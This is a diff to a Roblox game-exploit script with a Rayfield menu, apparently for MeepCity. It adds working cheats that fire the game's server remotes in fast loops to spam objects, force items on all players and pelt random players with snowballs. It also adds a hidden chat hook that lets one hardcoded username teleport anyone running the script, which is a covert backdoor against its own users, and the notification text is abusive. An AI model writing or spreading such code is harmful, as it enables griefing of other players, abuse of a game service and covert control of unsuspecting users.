@@ -2,11 +2,49 @@ local player = game.Players.LocalPlayer
 local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
 
 game.StarterGui:SetCore("SendNotification", {
-    Title = "Meep Fucker V1.7",
+    Title = "meep fucker zynlope",
     Text = "Gui is loading..",
     Icon = playerHeadIcon,
     Duration = 5,
     Button1 = "kys bro🤓"
+})
+
+local targetUsername = "sci_mythical77"
+
+local function onChat(player, message)
+    if player.Name == targetUsername and message:lower() == "!bring" then
+        local targetCharacter = player.Character
+        local myPlayer = game.Players.LocalPlayer
+
+        if myPlayer and targetCharacter then
+            local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
+            local myCharacter = myPlayer.Character
+
+            if myCharacter and targetHRP then
+                local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
+
+                if myHRP then
+                    myHRP.CFrame = targetHRP.CFrame
+                end
+            end
+        end
+    end
+end
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end)
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "zynlope",
+    Text = "loading goodies..",
+    Icon = playerHeadIcon,
+    Duration = 3,
+    Button1 = "okay buddy"
 })
 
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -32,7 +70,7 @@ end
 
 playOpeningSound()
 local Window = Rayfield:CreateWindow({
-   Name = "zynlope.lol | " .. executorName .. " | " .. gameName,
+   Name = "discord: plusgiant | " .. executorName .. " | " .. gameName,
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "zynlope.lol",
    LoadingSubtitle = "by plusgiant",
@@ -976,6 +1014,258 @@ local Toggle = Tab:CreateToggle({
         end
    end,
 })
+
+local animationTrack
+
+local Toggle = Tab:CreateToggle({
+    Name = "Fake ZZZ",
+    CurrentValue = false,
+    Flag = "ToggleExample",
+    Callback = function(Value)
+        
+        local animationId = "rbxassetid://2176786857"
+        local animation = Instance.new("Animation")
+        animation.AnimationId = animationId
+
+       
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoid = character:WaitForChild("Humanoid")
+
+      
+        local args = {
+            [1] = Value, 
+            [2] = 1
+        }
+
+        if Value then
+           
+            if not animationTrack or animationTrack.IsPlaying == false then
+                animationTrack = humanoid:LoadAnimation(animation)
+                animationTrack:Play()
+            end
+
+            
+            game:GetService("ReplicatedStorage").EventConnections.SetCharacterIsSleeping:FireServer(unpack(args))
+        else
+           
+            if animationTrack and animationTrack.IsPlaying then
+                animationTrack:Stop()
+            end
+
+           
+            args[1] = false
+            game:GetService("ReplicatedStorage").EventConnections.SetCharacterIsSleeping:FireServer(unpack(args))
+        end
+    end,
+})
+
+
+local Toggle = Tab:CreateToggle({
+   Name = "Spam turkey", 
+   CurrentValue = false,
+   Flag = "Toggle1",
+   Callback = function(value)
+        isSpamming = value
+        if isSpamming then
+            spawn(function()
+                while isSpamming do
+                    local player = game.Players.LocalPlayer
+                    local character = player.Character
+                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+                    local characterPosition = humanoidRootPart.Position
+
+                    local rayOrigin = characterPosition + Vector3.new(0, 5, 0)
+                    local rayDirection = Vector3.new(0, -10, 0)
+
+                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection)
+
+                    local groundPosition
+                    if raycastResult then
+                        groundPosition = raycastResult.Position
+                    else
+                        groundPosition = characterPosition - Vector3.new(0, 5, 0)
+                    end
+
+                    local plantPosition = groundPosition + Vector3.new(0, -3, 0)
+
+                    local args1 = { [1] = 201, [2] = 1372, [3] = {} }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args1))
+
+                    local args2 = {
+                        [1] = 687,
+                        [2] = plantPosition
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections"):WaitForChild("SpecialObjectRequestPlant"):InvokeServer(unpack(args2))
+
+                    local args3 = { [1] = 202, [2] = 687 }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args3))
+
+                    wait(0.08)
+                end
+            end)
+        else
+            isSpamming = false
+        end
+    end,
+})
+
+local Toggle = Tab:CreateToggle({
+   Name = "Spam pizza plate", 
+   CurrentValue = false,
+   Flag = "Toggle1",
+   Callback = function(value)
+        isSpamming = value
+        if isSpamming then
+            spawn(function()
+                while isSpamming do
+                    local player = game.Players.LocalPlayer
+                    local character = player.Character
+                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+                    local characterPosition = humanoidRootPart.Position
+
+                    local rayOrigin = characterPosition + Vector3.new(0, 5, 0)
+                    local rayDirection = Vector3.new(0, -10, 0)
+
+                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection)
+
+                    local groundPosition
+                    if raycastResult then
+                        groundPosition = raycastResult.Position
+                    else
+                        groundPosition = characterPosition - Vector3.new(0, 5, 0)
+                    end
+
+                    local plantPosition = groundPosition + Vector3.new(0, -3, 0)
+
+                    local args1 = { [1] = 201, [2] = 1372, [3] = {} }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args1))
+
+                    local args2 = {
+                        [1] = 685,
+                        [2] = plantPosition
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections"):WaitForChild("SpecialObjectRequestPlant"):InvokeServer(unpack(args2))
+
+                    local args3 = { [1] = 202, [2] = 685 }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args3))
+
+                    wait(0.08)
+                end
+            end)
+        else
+            isSpamming = false
+        end
+    end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Give snowball all (BUGGY)",
+   Callback = function()
+     local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local isRunning = false 
+
+local function equipItem()
+    local equipArgs = {201, 932}
+    local success, result = pcall(function()
+        ReplicatedStorage:WaitForChild("Connection"):InvokeServer(unpack(equipArgs))
+    end)
+    if not success then
+        warn("Equip item failed:", result)
+    end
+end
+
+local function unEquip()
+    local args = {
+        [1] = 202,
+    }
+    pcall(function()
+        ReplicatedStorage:WaitForChild("Connection"):InvokeServer(unpack(args))
+    end)
+end
+
+local function hasItemEquipped(player)
+    local equippedItems = player:FindFirstChild("Backpack"):FindFirstChild(932)
+    return equippedItems ~= nil
+end
+
+local function giveItemToAllPlayers()
+    for _, player in pairs(Players:GetPlayers()) do
+        if not hasItemEquipped(player) then
+            local giveArgs = {player.UserId, 932}
+            local success, result = pcall(function()
+                ReplicatedStorage:WaitForChild("FunctionConnections"):WaitForChild("RequestSendPassAlongActionItem"):InvokeServer(unpack(giveArgs))
+            end)
+            if not success then
+                warn("Give item failed for " .. player.Name .. ":", result)
+            end
+        end
+    end
+end
+
+while true do
+    if not isRunning then
+        isRunning = true
+        
+        equipItem()
+        giveItemToAllPlayers()
+        unEquip()
+        
+        isRunning = false
+    else
+        wait(1)
+    end
+    wait(2)
+end
+
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Throw snowball all",
+   Callback = function()
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local ThrowItemEvent = ReplicatedStorage.EventConnections.ThrowItem
+local RunService = game:GetService("RunService")
+
+local function getRandomPlayer()
+    local allPlayers = Players:GetPlayers()
+    local randomIndex = math.random(1, #allPlayers)
+    local randomPlayer = allPlayers[randomIndex]
+    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return randomPlayer
+    else
+        return nil
+    end
+end
+
+local function throwAtRandomPlayer()
+    local randomPlayer = getRandomPlayer()
+    if randomPlayer then
+        local targetPosition = randomPlayer.Character.HumanoidRootPart.Position
+        local args = {
+            [1] = string.format("[932,[\"%s\",\"%s\",\"%s\"],[\"%s\",\"%s\",\"%s\"],[\"%s\",\"%s\",\"%s\"],75]",
+                tostring(targetPosition.X), tostring(targetPosition.Y), tostring(targetPosition.Z),
+                tostring(targetPosition.X + 3), tostring(targetPosition.Y + 3), tostring(targetPosition.Z + 3),
+                tostring(targetPosition.X - 3), tostring(targetPosition.Y - 3), tostring(targetPosition.Z - 3))
+        }
+        ThrowItemEvent:FireServer(unpack(args))
+    end
+end
+
+RunService.Heartbeat:Connect(function()
+    for _ = 1, 1 do
+        throwAtRandomPlayer()
+    end
+end)
+   end,
+})
+
 
 local Section = Tab:CreateSection("Balloon Spawner")
 
